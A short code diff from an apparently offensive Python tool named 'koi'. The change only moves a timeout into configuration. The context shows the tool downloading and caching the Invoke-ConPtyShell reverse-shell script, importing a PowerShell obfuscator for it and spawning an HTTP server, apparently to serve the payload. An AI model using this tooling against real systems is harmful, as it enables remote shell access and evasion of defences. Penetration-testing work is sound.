@@ -9,6 +9,7 @@ from typing import Callable, Dict, Optional
 
 from koi.session import Session
 from koi.utils.cache import put_cache, get_cache, cache_path
+from koi.utils.config import TIMEOUTS
 from koi.utils.ps_obfuscate import obfuscate_conptyshell, _obfuscate_call
 from koi.utils.tcp import spawn_http_server
 from koi.utils.ui import Spinner, notify, bold, accent
@@ -38,7 +39,7 @@ _CONPTY_CACHE_NAME = "Invoke-ConPtyShell.ps1"
 
 def _fetch_conptyshell() -> tuple[bytes, str]:
     try:
-        with urllib.request.urlopen(_CONPTYSHELL_URL, timeout=15) as resp:
+        with urllib.request.urlopen(_CONPTYSHELL_URL, timeout=TIMEOUTS["http_fetch"]) as resp:
             ps1_data = resp.read()
         if not get_cache(_CONPTY_CACHE_NAME):
             put_cache(_CONPTY_CACHE_NAME, ps1_data)
